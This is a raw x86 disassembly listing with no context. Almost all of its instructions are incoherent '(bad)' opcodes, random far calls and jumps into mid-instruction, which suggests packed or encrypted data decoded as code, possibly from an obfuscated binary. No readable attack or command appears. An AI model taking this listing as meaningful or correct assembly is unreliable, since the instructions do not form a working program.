  40a7a0:	pop    esp
  40a7a1:	or     al,0xe7
  40a7a3:	stc    
  40a7a4:	sbb    DWORD PTR [ecx-0x46f64648],edx
  40a7aa:	rcr    BYTE PTR [esi-0x12c1ec18],cl
  40a7b0:	add    eax,0x222567bc
  40a7b5:	sbb    ebx,DWORD PTR [eax+0x12af7bde]
  40a7bb:	xor    DWORD PTR [esp+ebx*8-0x3a],esp
  40a7bf:	mov    al,ds:0xd083af0f
  40a7c4:	xchg   esi,eax
  40a7c5:	aaa    
  40a7c6:	in     al,0xde
  40a7c8:	and    eax,0x8f685789
  40a7cd:	mov    ebx,0x859b1a62
  40a7d2:	mov    edi,0xdc8ce07c
  40a7d7:	dec    ecx
  40a7d8:	jmp    0x40a852
  40a7da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7db:	call   0x165c:0xb9381cf2
  40a7e2:	mov    edx,0xf88cf427
  40a7e7:	fs test eax,0xf2bc9a01
  40a7ed:	ror    BYTE PTR [esi],1
  40a7ef:	mov    al,ds:0xac753595
  40a7f4:	bt     DWORD PTR ss:[esi],ebp
  40a7f8:	inc    esp
  40a7f9:	push   esp
  40a7fa:	fld    TBYTE PTR [edx+0x51de03b0]
  40a800:	pop    esp
  40a801:	add    BYTE PTR [ecx-0x6e67f34d],al
  40a807:	push   cs
  40a808:	add    DWORD PTR [eax],0x4b
  40a80b:	push   ds
  40a80c:	fldenv [eax+0x11a2d561]
  40a812:	ret    0xf6c9
  40a815:	xor    DWORD PTR [esi-0x764fc2aa],esp
  40a81b:	and    BYTE PTR [ebp+0x58],bl
  40a81e:	xor    eax,0x13d68576
  40a823:	mov    BYTE PTR ds:0xe95b2f5a,0x33
  40a82a:	sub    BYTE PTR [eax+0x49],cl
  40a82d:	inc    eax
  40a82e:	xchg   esp,eax
  40a82f:	lods   al,BYTE PTR ds:[esi]
  40a830:	pop    edx
  40a831:	fndisi(8087 only) 
  40a833:	mov    ah,0xcb
  40a835:	hlt    
  40a836:	enter  0xb2dc,0x7b
  40a83a:	es sbb edi,eax
  40a83d:	mov    ecx,0xa7eedbc2
  40a842:	fsub   DWORD PTR [ebp+0x43b7fafe]
  40a848:	mov    dl,0x1b
  40a84a:	sub    eax,0xb4ea6d0c
  40a84f:	je     0x40a816
  40a851:	les    esi,FWORD PTR [esi-0x6dc52da0]
  40a857:	shl    DWORD PTR [edi+0x72],cl
  40a85a:	dec    ecx
  40a85b:	pop    esi
  40a85c:	mov    ebp,es
  40a85e:	(bad)  
  40a85f:	push   ss
  40a860:	fldcw  WORD PTR [esi-0x6aa153b8]
  40a866:	sbb    DWORD PTR [eax+0x4d],0x2a
  40a86a:	or     edi,DWORD PTR [edx]
  40a86c:	sub    eax,DWORD PTR ds:0x7426641
  40a872:	fidiv  WORD PTR [edx]
  40a874:	jp     0x40a8cc
  40a876:	mov    al,BYTE PTR [edx+0x0]
  40a879:	mov    bl,0xec
  40a87b:	test   al,0x98
  40a87d:	xchg   edi,eax
  40a87e:	(bad)  
  40a87f:	ja     0x40a8d4
  40a881:	in     al,dx
  40a882:	xor    eax,0xa689cb83
  40a887:	sbb    al,0x78
  40a889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a88a:	enter  0x6230,0xda
  40a88e:	aad    0xdd
  40a890:	sbb    dl,bh
  40a892:	adc    BYTE PTR [edx+0x4f],ah
  40a895:	stos   DWORD PTR es:[edi],eax
  40a896:	das    
  40a897:	ds lahf 
  40a899:	es pop ecx
  40a89b:	xor    eax,DWORD PTR [ecx-0x5]
  40a89e:	ss lock cdq 
  40a8a1:	inc    edi
  40a8a2:	mov    esi,0x5171beaf
  40a8a7:	int3   
  40a8a8:	das    
  40a8a9:	mov    dl,0xc4
  40a8ab:	rol    BYTE PTR [edi-0x136885f0],cl
  40a8b1:	in     al,dx
  40a8b2:	cld    
  40a8b3:	xchg   ebp,eax
  40a8b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8b5:	jmp    0x40a8d0
  40a8b7:	or     dl,BYTE PTR [eax+0x17]
  40a8ba:	pop    eax
  40a8bb:	or     DWORD PTR [eax-0x73c970c4],ebx
  40a8c1:	mov    dl,BYTE PTR [edi+0x3401ba99]
  40a8c7:	(bad)  
  40a8c8:	mov    eax,ds:0x43dd0ce6
  40a8cd:	or     BYTE PTR [eax],dh
  40a8cf:	xchg   esp,eax
  40a8d0:	mov    ebx,0xf9d81539
  40a8d5:	xlat   BYTE PTR ds:[ebx]
  40a8d6:	push   edx
  40a8d7:	int3   
  40a8d8:	(bad)  
  40a8d9:	frstor [edi+ebx*2]
  40a8dc:	out    0x8d,eax
  40a8de:	dec    ebp
  40a8df:	(bad)  
  40a8e0:	xor    edx,DWORD PTR [edi-0x2d]
  40a8e3:	cmp    bh,ah
  40a8e5:	push   ebx
  40a8e6:	jle    0x40a890
  40a8e8:	cmp    BYTE PTR [esi-0x47d78eb],cl
  40a8ee:	lahf   
  40a8ef:	pop    esi
  40a8f0:	or     cl,al
  40a8f2:	push   esp
  40a8f3:	lahf   
  40a8f4:	hlt    
  40a8f5:	push   edi
  40a8f6:	aaa    
  40a8f7:	fisttp WORD PTR fs:[edx]
  40a8fa:	out    0x3a,eax
  40a8fc:	fwait
  40a8fd:	pop    es
  40a8fe:	loopne 0x40a95e
  40a900:	add    al,0x89
  40a902:	call   0x86cb:0x6db67a81
  40a909:	xor    edi,eax
  40a90b:	xchg   ebx,eax
  40a90c:	in     al,0xb4
  40a90e:	pop    es
  40a90f:	sar    dh,cl
  40a911:	sub    al,0xce
  40a913:	stos   DWORD PTR es:[edi],eax
  40a914:	xchg   ebp,eax
  40a915:	call   0x506a:0xb08667d8
  40a91c:	stos   DWORD PTR es:[edi],eax
  40a91d:	stc    
  40a91e:	scas   al,BYTE PTR es:[edi]
  40a91f:	loope  0x40a8a7
  40a921:	neg    BYTE PTR [esi-0x6b]
  40a924:	pop    ebp
  40a925:	push   ss
  40a926:	sbb    eax,0x2882f7df
  40a92b:	sub    al,0x0
  40a92d:	push   0xffffffa1
  40a92f:	pop    ebp
  40a930:	cwde   
  40a931:	fsub   QWORD PTR [eax]
  40a933:	and    BYTE PTR [esi+0x2],al
  40a936:	or     esi,DWORD PTR [eax-0x76a39336]
  40a93c:	sbb    al,0x9c
  40a93e:	push   esi
  40a93f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a940:	into   
  40a941:	push   ebx
  40a942:	or     al,0x6c
  40a944:	jp     0x40a9b4
  40a946:	cmp    esp,DWORD PTR ds:[ecx+0x6b13746f]
  40a94d:	adc    bl,BYTE PTR [ecx+0x7d988a7b]
  40a953:	cmp    eax,0xfc2c77e3
  40a958:	scas   eax,DWORD PTR es:[edi]
  40a959:	imul   eax,DWORD PTR [edi+esi*2],0xd8efed48
  40a960:	add    ebx,esi
  40a962:	das    
  40a963:	push   ecx
  40a964:	mov    eax,ds:0xff7b9427
  40a969:	jle    0x40a9d4
  40a96b:	pusha  
  40a96c:	(bad)  
  40a96d:	xchg   ebp,eax
  40a96e:	loope  0x40a9d8
  40a970:	mov    bl,0xf8
  40a972:	aad    0xa
  40a974:	ds and ch,ch
  40a977:	aad    0x24
  40a979:	rol    BYTE PTR [ebp+0x14322192],0x86
  40a980:	in     al,dx
  40a981:	lds    edx,FWORD PTR ds:0x4cde9dff
  40a987:	sub    DWORD PTR ds:0x781c5132,esp
  40a98d:	xchg   esi,eax
  40a98e:	mov    BYTE PTR [eax+edi*2-0xd],ah
  40a992:	jecxz  0x40a975
  40a994:	jecxz  0x40a95e
  40a996:	jp     0x40a9b0
  40a998:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a999:	dec    eax
  40a99a:	adc    BYTE PTR [eax-0x716b5a24],0x3
  40a9a1:	adc    al,0x46
  40a9a3:	lds    ecx,FWORD PTR [esi+0x33]
  40a9a6:	fild   DWORD PTR [edx-0xcfb712d]
  40a9ac:	adc    ebx,DWORD PTR [eax]
  40a9ae:	fld    QWORD PTR [eax]
  40a9b0:	data16 je 0x40a952
  40a9b3:	and    BYTE PTR [ebp-0x50ff0b8a],cl
  40a9b9:	xchg   edx,eax
  40a9ba:	cmp    esp,esi
  40a9bc:	or     edi,DWORD PTR [eax+0x4d]
  40a9bf:	fwait
  40a9c0:	aaa    
  40a9c1:	cmp    eax,0x81f6e730
  40a9c6:	push   es
  40a9c7:	push   ss
  40a9c8:	and    al,BYTE PTR ds:0x25792a9
  40a9ce:	ins    BYTE PTR es:[edi],dx
  40a9cf:	pop    edx
  40a9d0:	add    bh,al
  40a9d2:	adc    dl,al
  40a9d4:	jb     0x40aa26
  40a9d6:	lds    ebx,FWORD PTR [edi+0x3e4f4146]
  40a9dc:	xlat   BYTE PTR ds:[ebx]
  40a9dd:	rol    DWORD PTR [edx+0x236af35e],1
  40a9e3:	iret   
  40a9e4:	xor    BYTE PTR [esi],0xee
  40a9e7:	sub    eax,0x86f6d546
  40a9ec:	jg     0x40a9f8
  40a9ee:	and    bl,cl
  40a9f0:	cld    
  40a9f1:	data16 sub BYTE PTR [ebx],bh
  40a9f4:	pop    ds
  40a9f5:	xchg   esp,eax
  40a9f6:	sahf   
  40a9f7:	retf   
  40a9f8:	inc    edx
  40a9f9:	xchg   esi,eax
  40a9fa:	imul   eax,DWORD PTR [eax+0xb880d3e],0x13
  40aa01:	scas   eax,DWORD PTR es:[edi]
  40aa02:	jp     0x40aa81
  40aa04:	cmc    
  40aa05:	xchg   ebp,eax
  40aa06:	and    al,0xda
  40aa08:	push   eax
  40aa09:	lods   eax,DWORD PTR ds:[esi]
  40aa0a:	add    BYTE PTR [ebx],0x6c
  40aa0d:	mov    edx,DWORD PTR [ecx]
  40aa0f:	mov    eax,0xc45ed47a
  40aa14:	fwait
  40aa15:	xlat   BYTE PTR ds:[ebx]
  40aa16:	adc    BYTE PTR [eax-0x4f7daec0],0x57
  40aa1d:	test   eax,0x86be0e00
  40aa22:	dec    ebp
  40aa23:	fbstp  TBYTE PTR [ecx-0x4f]
  40aa26:	mov    ch,0x8b
  40aa28:	push   edi
  40aa29:	xchg   BYTE PTR [eax+0x13493932],ah
  40aa2f:	cmp    ch,BYTE PTR [edi]
  40aa31:	cmp    eax,esi
  40aa33:	add    eax,0xe5ecbaef
  40aa38:	sbb    dh,cl
  40aa3a:	jecxz  0x40aa3e
  40aa3c:	lock jb 0x40aa76
  40aa3f:	nop
  40aa40:	in     al,dx
  40aa41:	inc    edx
  40aa42:	mov    eax,0xdd2a1a99
  40aa47:	into   
  40aa48:	inc    ebp
  40aa49:	popf   
  40aa4a:	test   BYTE PTR [eax+ebx*8+0x10935c1c],cl
  40aa51:	mov    ecx,0xff2121f2
  40aa56:	sbb    BYTE PTR [edi-0x3e],cl
  40aa59:	inc    ecx
  40aa5a:	xor    al,0xdf
  40aa5c:	adc    BYTE PTR [edx-0x54],dl
  40aa5f:	mov    edx,0x481dfa46
  40aa64:	push   0x4d9ae3da
  40aa69:	pop    ecx
  40aa6a:	clc    
  40aa6b:	cli    
  40aa6c:	xor    cl,BYTE PTR [ebx+ebp*4+0x22]
  40aa70:	loopne 0x40aa04
  40aa72:	hlt    
  40aa73:	mov    al,0xa6
  40aa75:	(bad)  
  40aa77:	jp     0x40aa8e
  40aa79:	push   eax
  40aa7a:	inc    ebp
  40aa7b:	xchg   ebp,eax
  40aa7c:	lock (bad) 
  40aa7e:	loopne 0x40aa64
  40aa80:	out    0xac,al
  40aa82:	test   bl,dh
  40aa84:	add    BYTE PTR [ecx+0x63],cl
  40aa87:	sub    BYTE PTR [edi-0x10ecf72],dl
  40aa8d:	nop
  40aa8e:	push   0xbac13395
  40aa93:	(bad)  [edx+0x32]
  40aa96:	add    BYTE PTR [ebx],al
  40aa98:	ret    0x4589
  40aa9b:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0xe04557bc
  40aacc:	mov    dl,BYTE PTR [esp+esi*8+0x62]
  40aad0:	bound  edx,QWORD PTR [eax]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx+0x40]
  40aad6:	pop    ebp
  40aad7:	mov    al,0x74
  40aad9:	xlat   BYTE PTR ds:[ebx]
  40aada:	sbb    al,0xb3
  40aadc:	xchg   ebp,eax
  40aadd:	es dec ecx
  40aadf:	dec    esp
  40aae0:	jne    0x40aaa9
  40aae2:	cmp    al,BYTE PTR [edi]
  40aae4:	idiv   BYTE PTR [ecx+esi*1+0x15]
  40aae8:	sub    al,0x44
  40aaea:	mov    esi,0xf0dec825
  40aaef:	in     eax,dx
  40aaf0:	push   ecx
  40aaf1:	cli    
  40aaf2:	dec    esp
  40aaf3:	in     eax,0x5e
  40aaf5:	int3   
  40aaf6:	xchg   ecx,eax
  40aaf7:	das    
  40aaf8:	stc    
  40aaf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aafa:	and    eax,0xa2ea7f96
  40aaff:	jnp    0x40aa8d
  40ab01:	pusha  
  40ab02:	add    eax,0x1ee1e1f4
  40ab07:	xor    ah,al
  40ab09:	and    esp,edi
  40ab0b:	inc    edx
  40ab0c:	clc    
  40ab0d:	jp     0x40aad3
  40ab0f:	(bad)  
  40ab10:	jmp    0x40ab37
  40ab12:	retf   
  40ab13:	fcom   DWORD PTR [ecx+ecx*1]
  40ab16:	rcr    dl,cl
  40ab18:	ss or  eax,0x5a3c7612
  40ab1e:	mov    bh,0xa
  40ab20:	ret    
  40ab21:	rol    BYTE PTR [ebp-0x9],1
  40ab24:	fwait
  40ab25:	xor    al,0x90
  40ab27:	sub    dl,al
  40ab29:	neg    DWORD PTR [ecx+ebx*1-0xfb0fcb8]
  40ab30:	jge    0x40ab3c
  40ab32:	scas   eax,DWORD PTR es:[edi]
  40ab33:	push   eax
  40ab34:	xchg   esi,eax
  40ab35:	push   ecx
  40ab36:	add    DWORD PTR [esi],ebp
  40ab38:	jns    0x40abae
  40ab3a:	les    edi,FWORD PTR [eax]
  40ab3c:	nop
  40ab3d:	cwde   
  40ab3e:	int    0xf9
  40ab40:	mov    BYTE PTR [esp+eiz*2+0x79],bh
  40ab44:	rol    ah,cl
  40ab46:	cmp    eax,0x93964067
  40ab4b:	jle    0x40ab7e
  40ab4d:	test   eax,0x9cd03286
  40ab52:	mov    BYTE PTR [edx],0xda
  40ab55:	xor    al,0x6e
  40ab57:	adc    BYTE PTR [eax+esi*8],bl
  40ab5a:	jne    0x40abb3
  40ab5c:	std    
  40ab5d:	mov    ebp,?
  40ab5f:	sub    ah,BYTE PTR [ecx]
  40ab61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab62:	lods   al,BYTE PTR ds:[esi]
  40ab63:	ret    0xd8f
  40ab66:	xor    esp,DWORD PTR [edi-0x3376da8]
  40ab6c:	cdq    
  40ab6d:	pop    es
  40ab6e:	out    0xbd,eax
  40ab70:	adc    eax,0x3d6d5dfe
  40ab75:	jnp    0x40abed
  40ab77:	fsubp  st(2),st
  40ab79:	and    al,0x6
  40ab7b:	rcr    DWORD PTR ds:0x6fcf0ff5,cl
  40ab81:	cmc    
  40ab82:	sbb    DWORD PTR [ebx+0x3707c40f],esi
  40ab88:	mov    dl,0xd8
  40ab8a:	mov    ecx,0xc2d8926a
  40ab8f:	push   ebp
  40ab90:	idiv   BYTE PTR [edx+edi*8+0x5e]
  40ab94:	mov    edx,0xedd6d339
  40ab99:	fcmovnbe st,st(5)
  40ab9b:	cdq    
  40ab9c:	hlt    
  40ab9d:	push   ss
  40ab9e:	push   ebx
  40ab9f:	imul   ecx,ebx,0x2a9bf765
  40aba5:	or     al,0xbd
  40aba7:	mov    cl,0x9c
  40aba9:	neg    BYTE PTR [ebx]
  40abab:	push   ds
  40abac:	push   esp
  40abad:	cdq    
  40abae:	add    esp,esi
  40abb0:	(bad)  
  40abb1:	shl    DWORD PTR ds:0x7ec597c5,cl
  40abb7:	ins    BYTE PTR es:[edi],dx
  40abb8:	in     eax,dx
  40abb9:	imul   esp,DWORD PTR [esi],0x37
  40abbc:	ret    0xd099
  40abbf:	ss sub ch,bh
  40abc2:	sub    BYTE PTR [ecx],0x7b
  40abc5:	shr    DWORD PTR [ebp+0x29],cl
  40abc8:	mov    eax,0x491e3d78
  40abcd:	imul   edx,eax,0xfffffff7
  40abd0:	pop    es
  40abd1:	mov    dh,0xe5
  40abd3:	push   cs
  40abd4:	sub    al,0xc2
  40abd6:	ins    DWORD PTR es:[edi],dx
  40abd7:	arpl   dx,ax
  40abd9:	addr16 inc esp
  40abdb:	retf   
  40abdc:	mov    esp,DWORD PTR [edx+0x20559132]
  40abe2:	mov    dl,0xff
  40abe4:	popa   
  40abe5:	adc    eax,0x570b9d38
  40abea:	add    BYTE PTR [edi],cl
  40abec:	aaa    
  40abed:	push   edi
  40abee:	push   ds
  40abef:	arpl   WORD PTR [ebp+0x54],si
  40abf2:	nop
  40abf3:	std    
  40abf4:	cmp    BYTE PTR [ecx-0x3c],ah
  40abf7:	jno    0x40abd3
  40abf9:	or     DWORD PTR [ebx+eiz*2+0x56],edi
  40abfd:	in     al,dx
  40abfe:	out    dx,al
  40abff:	cmp    DWORD PTR [edi],ecx
  40ac01:	xor    DWORD PTR [esi],0x6f
  40ac04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac05:	nop
  40ac06:	cs je  0x40abe4
  40ac09:	(bad)  
  40ac0a:	pop    esp
  40ac0b:	popw   ss
  40ac0d:	mov    DWORD PTR [eax],esp
  40ac0f:	mov    dh,0x4f
  40ac11:	cmp    DWORD PTR [ebx+ebx*8],ebx
  40ac14:	add    al,0x13
  40ac16:	cs mov fs,esi
  40ac19:	inc    eax
  40ac1a:	jecxz  0x40abe9
  40ac1c:	push   ebx
  40ac1d:	mov    edx,DWORD PTR [esi]
  40ac1f:	mov    dl,0xec
  40ac21:	outs   dx,DWORD PTR ds:[esi]
  40ac22:	adc    dh,0x5c
  40ac25:	cmp    eax,0x85e25287
  40ac2a:	sub    al,0x13
  40ac2c:	mov    al,ds:0x64787e7b
  40ac31:	lds    esp,FWORD PTR [edx]
  40ac33:	fisubr DWORD PTR [edx]
  40ac35:	rol    esi,cl
  40ac37:	test   al,0x43
  40ac39:	cmp    eax,0x993cf956
  40ac3e:	mov    eax,ds:0x3112e4a0
  40ac43:	mov    gs,esi
  40ac45:	mov    ds:0x5da9ddd9,eax
  40ac4a:	shl    BYTE PTR [eax],1
  40ac4c:	mov    esp,0xf4cac0f3
  40ac51:	mov    dh,0xcc
  40ac53:	mov    ch,0xf
  40ac55:	lahf   
  40ac56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac57:	mov    ebp,0xae38fe65
  40ac5c:	in     al,dx
  40ac5d:	nop
  40ac5e:	ins    DWORD PTR es:[edi],dx
  40ac5f:	adc    al,0x65
  40ac61:	inc    edi
  40ac62:	dec    ecx
  40ac63:	xchg   ecx,eax
  40ac64:	mov    ds:0x7e51152c,eax
  40ac69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac6a:	push   ds
  40ac6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac6c:	cmp    bl,BYTE PTR [ebx-0x244b8636]
  40ac72:	dec    eax
  40ac73:	sti    
  40ac74:	inc    ecx
  40ac75:	mov    ds:0x89d22dbd,al
  40ac7a:	cmp    BYTE PTR [edi+0x2bb5eb0],cl
  40ac80:	or     eax,ebp
  40ac82:	xor    ebp,ecx
  40ac84:	inc    eax
  40ac85:	push   esp
  40ac86:	jbe    0x40ac29
  40ac88:	add    BYTE PTR [esi+0x49],ah
  40ac8b:	rcl    DWORD PTR [ebx-0x50],1
  40ac8e:	or     ebx,DWORD PTR [esp+ebx*8+0x6b]
  40ac92:	pcmpgtd mm0,QWORD PTR [eax]
  40ac95:	dec    eax
  40ac96:	cmp    al,0x73
  40ac98:	popa   
  40ac99:	pop    ss
  40ac9a:	cmp    BYTE PTR [ebp+0x9],dh
  40ac9d:	retf   0x3e07
  40aca0:	mov    ebp,0x6df06fdc
  40aca5:	inc    ebx
  40aca6:	or     DWORD PTR [esi-0x7c6d5cd],ebp
  40acac:	fadd   DWORD PTR [esi]
  40acae:	ret    0x98a1
  40acb1:	iret   
  40acb2:	call   0x7bc83566
  40acb7:	add    dh,BYTE PTR [eax+edx*1+0x54]
  40acbb:	(bad)  
  40acbc:	gs inc eax
  40acbe:	aad    0x14
  40acc0:	lods   eax,DWORD PTR ds:[esi]
  40acc1:	imul   edi,DWORD PTR [edi+0x50a0b6dd],0x2e
  40acc8:	test   al,0xc6
  40acca:	addr16 dec edx
  40accc:	popf   
  40accd:	sub    eax,0x785b8246
  40acd2:	sub    BYTE PTR [ecx+0x57650c30],bl
  40acd8:	stos   BYTE PTR es:[edi],al
  40acd9:	scas   eax,DWORD PTR es:[edi]
  40acda:	aad    0x96
  40acdc:	mov    bh,BYTE PTR [ecx]
  40acde:	rol    cl,1
  40ace0:	xchg   esp,eax
  40ace1:	popa   
  40ace2:	and    ebp,0x90a63a0a
  40ace8:	xchg   ecx,eax
  40ace9:	shl    DWORD PTR [eax+0x37],1
  40acec:	ror    dh,1
  40acee:	cwde   
  40acef:	adc    BYTE PTR [ecx+esi*1+0x2eeeb998],al
  40acf6:	ins    DWORD PTR es:[edi],dx
  40acf7:	xchg   DWORD PTR [eax-0x71640343],edx
  40acfd:	jns    0x40ac81
  40acff:	(bad)  
  40ad01:	cs jge 0x40acd8
  40ad04:	inc    ebx
  40ad05:	inc    esi
  40ad06:	jne    0x40acb9
  40ad08:	mov    eax,0xf05a92fb
  40ad0d:	mov    ebx,0x94387d0b
  40ad12:	add    BYTE PTR [ecx-0x677f212],0xd2
  40ad19:	cmp    eax,0x51dd4dd2
  40ad1e:	mov    eax,ds:0x6c3378ce
  40ad23:	imul   edi,DWORD PTR ds:0xc46c7963,0x778d6721
  40ad2d:	xor    DWORD PTR [edx+0x51],edx
  40ad30:	or     DWORD PTR ds:0x5d784f0b,esp
  40ad36:	sub    ebp,0xa958e9bd
  40ad3c:	mov    ebx,0x7998995f
  40ad41:	mov    edi,edx
  40ad43:	xor    DWORD PTR [ebx],0xffffffb4
  40ad46:	sahf   
  40ad47:	pop    esp
  40ad48:	loope  0x40ad79
  40ad4a:	mov    eax,0x978ed939
  40ad4f:	mov    ebp,0x5dcd456d
  40ad54:	sti    
  40ad55:	pop    ebp
  40ad56:	mov    ebx,0xabc320ad
  40ad5b:	mov    ebp,0xbb859299
  40ad60:	(bad)
  40ad64:	stos   DWORD PTR es:[edi],eax
  40ad65:	jae    0x40adbb
  40ad67:	fisttp DWORD PTR [ecx]
  40ad69:	pop    ss
  40ad6a:	es js  0x40ad7f
  40ad6d:	in     al,0x52
  40ad6f:	add    DWORD PTR [esp+edi*8+0x15b4cd35],edi
  40ad76:	icebp  
  40ad77:	sbb    ch,BYTE PTR [esi+0x3f]
  40ad7a:	xchg   ebx,eax
  40ad7b:	and    eax,0xf30d3da5
  40ad80:	daa    
  40ad81:	jnp    0x40ad23
  40ad83:	mov    DWORD PTR [ecx-0x40],edi
  40ad86:	mov    edx,0xf7eb44ba
  40ad8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad8c:	retf   
  40ad8d:	loope  0x40ad91
  40ad8f:	fsubrp st(4),st
  40ad91:	imul   ecx,DWORD PTR [ecx-0x45434f38],0x91e97ebd
  40ad9b:	repnz mov ?,edi
  40ad9e:	pop    es
  40ad9f:	xor    al,BYTE PTR [esi+0x113c24f4]
  40ada5:	scas   eax,DWORD PTR es:[edi]
  40ada6:	xor    esi,edi
  40ada8:	xchg   DWORD PTR [ecx+0x38],edi
  40adab:	retf   0xd32a
  40adae:	xchg   ebx,eax
  40adaf:	pop    edi
  40adb0:	mov    eax,ds:0xac73bae2
  40adb5:	push   0xffffffc7
  40adb7:	xor    eax,0x1674b15f
  40adbc:	call   0xda81255
  40adc1:	loopne 0x40adfe
  40adc3:	mov    edx,cs
  40adc5:	rol    bl,1
  40adc7:	adc    ecx,edx
  40adc9:	xchg   bh,ah
  40adcb:	xlat   BYTE PTR ds:[ebx]
  40adcc:	scas   eax,DWORD PTR es:[edi]
  40adcd:	mov    ds:0x4f056ecf,al
  40add2:	push   eax
  40add3:	mov    ?,WORD PTR [edi+0x727f6d75]
  40add9:	xor    al,0x5b
  40addb:	sbb    BYTE PTR [ecx+0x2bb45e50],bl
  40ade1:	mov    BYTE PTR [edx-0x10],0x38
  40ade5:	and    esi,DWORD PTR [edi]
  40ade7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ade8:	jmp    DWORD PTR [ecx-0x67]
  40adeb:	xchg   edx,eax
  40adec:	in     eax,dx
  40aded:	push   0xdc17203b
  40adf2:	hlt    
  40adf3:	mov    ecx,0x7687d78c
  40adf8:	les    esi,FWORD PTR [eax-0x7a]
  40adfb:	cmp    dl,BYTE PTR [edx+0x11]
  40adfe:	nop
  40adff:	xor    DWORD PTR [eax],ecx
  40ae01:	mov    dl,BYTE PTR [edx]
  40ae03:	mul    dh
  40ae05:	mov    DWORD PTR [edx+0x5076782d],0xc99ff811
  40ae0f:	sub    eax,DWORD PTR [ebx-0x7ca85362]
  40ae15:	fwait
  40ae16:	push   esp
  40ae17:	sub    dl,dh
  40ae19:	sbb    cl,BYTE PTR [edx+0x12392b7e]
  40ae1f:	mov    esp,0x79307f1b
  40ae24:	cmp    cl,BYTE PTR [edi+0x39ac2d5c]
  40ae2a:	ret    
  40ae2b:	dec    edx
  40ae2c:	cmp    edx,esp
  40ae2e:	push   edx
  40ae2f:	lods   eax,DWORD PTR ds:[esi]
  40ae30:	inc    eax
  40ae31:	mov    ah,0x6d
  40ae33:	mov    ah,0xbc
  40ae35:	sbb    BYTE PTR [ecx-0x5142d243],0x30
  40ae3c:	retf   
  40ae3d:	cdq    
  40ae3e:	mov    ds:0x46ad602b,al
  40ae43:	fisubr DWORD PTR [ebx]
  40ae45:	sub    bl,BYTE PTR [eax+0x58244770]
  40ae4b:	call   0xd928a406
  40ae50:	inc    ebx
  40ae51:	and    al,0x21
  40ae53:	inc    eax
  40ae54:	sbb    BYTE PTR [edi],ah
  40ae56:	xchg   ecx,eax
  40ae57:	(bad)  
  40ae58:	dec    DWORD PTR [edi-0x25]
  40ae5b:	cwde   
  40ae5c:	adc    dl,bh
  40ae5e:	inc    edi
  40ae5f:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae61:	xchg   esp,eax
  40ae62:	out    dx,eax
  40ae63:	inc    edi
  40ae64:	dec    ebx
  40ae65:	mov    eax,0xe0fcbc71
  40ae6a:	xor    BYTE PTR [eax+0x17],dh
  40ae6d:	js     0x40ae3a
  40ae6f:	inc    ecx
  40ae70:	jno    0x40ae62
  40ae72:	xor    ebp,edx
  40ae74:	in     eax,0xcb
  40ae76:	out    dx,al
  40ae77:	jae    0x40aee1
  40ae79:	pop    ebx
  40ae7a:	adc    eax,0xefa5f0f6
  40ae7f:	mov    bh,0xbb
  40ae81:	jno    0x40ae04
  40ae83:	or     cl,BYTE PTR [edx+0x7cc180dd]
  40ae89:	or     ecx,DWORD PTR [ecx-0x4b]
  40ae8c:	cmp    al,0x52
  40ae8e:	loop   0x40aeb2
  40ae90:	aaa    
  40ae91:	mov    al,0x10
  40ae93:	mov    eax,0x9965266e
  40ae98:	into   
  40ae99:	cmp    ch,dh
  40ae9b:	xchg   DWORD PTR [eax+0x6a],edi
  40ae9e:	(bad)  
  40ae9f:	dec    ebx
  40aea0:	or     al,0xa
  40aea2:	mov    ds:0x63874b32,eax
  40aea7:	inc    edi
  40aea8:	cld    
  40aea9:	stos   BYTE PTR es:[edi],al
  40aeaa:	mov    dl,BYTE PTR [esi-0x4]
  40aead:	dec    edx
  40aeae:	xchg   edx,eax
  40aeaf:	out    dx,al
  40aeb0:	ficom  WORD PTR [eax-0x73a8025c]
  40aeb6:	sahf   
  40aeb7:	aaa    
  40aeb8:	out    0xb4,eax
  40aeba:	jecxz  0x40ae3f
  40aebc:	ficom  WORD PTR [ecx-0x3d169a33]
  40aec2:	mov    dh,0xa5
  40aec4:	lods   eax,DWORD PTR ds:[esi]
  40aec5:	pop    ebp
  40aec6:	add    al,0x2c
  40aec8:	jb     0x40af16
  40aeca:	jg     0x40aef9
  40aecc:	add    al,0x8
  40aece:	pushf  
  40aecf:	sbb    bl,BYTE PTR [esi-0x1b21f9fc]
  40aed5:	push   ss
  40aed6:	fisttp DWORD PTR [ecx+0x17]
  40aed9:	pop    edx
  40aeda:	mov    bh,0x9e
  40aedc:	sub    edi,ebx
  40aede:	int3   
  40aedf:	pop    es
  40aee0:	dec    edx
  40aee1:	and    BYTE PTR [ebx+0x52],bh
  40aee4:	in     eax,dx
  40aee5:	fs js  0x40af65
  40aee8:	xchg   ebp,eax
  40aee9:	(bad)  
  40aeea:	cld    
  40aeeb:	ret    0xb776
  40aeee:	icebp  
  40aeef:	ret    
  40aef0:	lahf   
  40aef1:	(bad)  
  40aef2:	repz jne 0x40af4d
  40aef5:	mov    edx,0x14725280
